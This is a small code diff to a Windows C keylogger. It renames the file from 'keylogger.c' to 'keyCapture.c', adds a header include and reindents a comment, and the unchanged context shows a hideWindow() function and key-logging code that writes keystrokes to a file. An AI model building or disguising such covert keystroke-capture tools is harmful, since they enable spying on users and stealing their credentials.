@@ -4,9 +4,9 @@
 # Version: 1.0.0
 #  - Major.Minor.Update/BuildNumber
 # Date: 202054OCT25
-# Filename: keylogger.c
+# Filename: keyCapture.c
 # Dependency: N/A
-# Compile Cmd: gcc -m64 -O1 keylogger.c -o keylogger-v1.0.0-win-x86-64
+# Compile Cmd: gcc -m64 -O1 keyCapture.c -o keyCapture-v1.0.0-win-x86-64
 # Synopsis:
 #  - Overview: describes what the program does, how it works, and its key components
 #  - Technical: ...
@@ -17,6 +17,7 @@
 #include <stdio.h>
 #include <errno.h>
 #include <windows.h>
+#include <winuser.h>
 #include <stdbool.h>
 
 void hideWindow(void) {
@@ -129,7 +130,7 @@ void logging() {
 							break;
 						}
 
-							   //VIRTUAL KEYS NAMED CONSTANTS IN WINDOWS API (windows.h/winuser.h)
+						//VIRTUAL KEYS NAMED CONSTANTS IN WINDOWS API (windows.h/winuser.h)
 						case VK_SPACE: {
 							fputc(' ', pFile);
 							break;
